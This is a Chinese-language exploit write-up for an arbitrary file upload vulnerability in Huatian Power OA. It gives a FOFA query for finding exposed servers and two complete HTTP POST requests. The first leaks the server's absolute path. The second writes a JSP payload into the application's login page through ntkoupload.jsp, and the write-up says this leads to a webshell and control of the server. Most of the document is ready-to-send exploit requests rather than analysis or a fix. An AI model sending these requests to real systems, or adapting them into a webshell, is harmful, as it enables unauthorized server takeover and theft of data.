# 华天动力OA系统upload.jsp任意文件上传漏洞

华天动力协同办公系统将先进的管理思想、管理模式和软件技术、网络技术相结合，为用户提供了低成本、高效能的协同办公和管理平台。睿智的管理者通过使用华天动力协同办公平台，在加强规范工作流程、强化团队执行、推动精细管理、促进营业增长等工作中取得了良好的成效。华天动力OA存在任意文件上传漏洞，攻击者可以上传任意文件，获取webshell，控制服务器权限，读取敏感信息等。

## fofa

```yaml
body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app"
```

## poc

获取绝对路径

```java
POST /OAapp/jsp/upload.jsp HTTP/1.1
Host: x.x.x.x:xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5Ur8laykKAWws2QO
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 293

------WebKitFormBoundary5Ur8laykKAWws2QO
Content-Disposition: form-data; name="file"; filename="xxx.xml"
Content-Type: image/png

real path
------WebKitFormBoundary5Ur8laykKAWws2QO
Content-Disposition: form-data; name="filename"

xxx.png
------WebKitFormBoundary5Ur8laykKAWws2QO--
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411281028921.webp)

将“123”写入到normalLoginPageForOther.jsp文件中去

```javascript
POST /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp HTTP/1.1
Host: x.x.x.x:xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 389

------WebKitFormBoundaryzRSYXfFlXqk6btQm
Content-Disposition: form-data; name="EDITFILE"; filename="xxx.txt"
Content-Type: image/png

<%out.print("123");%>
------WebKitFormBoundaryzRSYXfFlXqk6btQm
Content-Disposition: form-data; name="newFileName"

D:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
------WebKitFormBoundaryzRSYXfFlXqk6btQm--
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411281029565.webp)

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411281029962.webp)
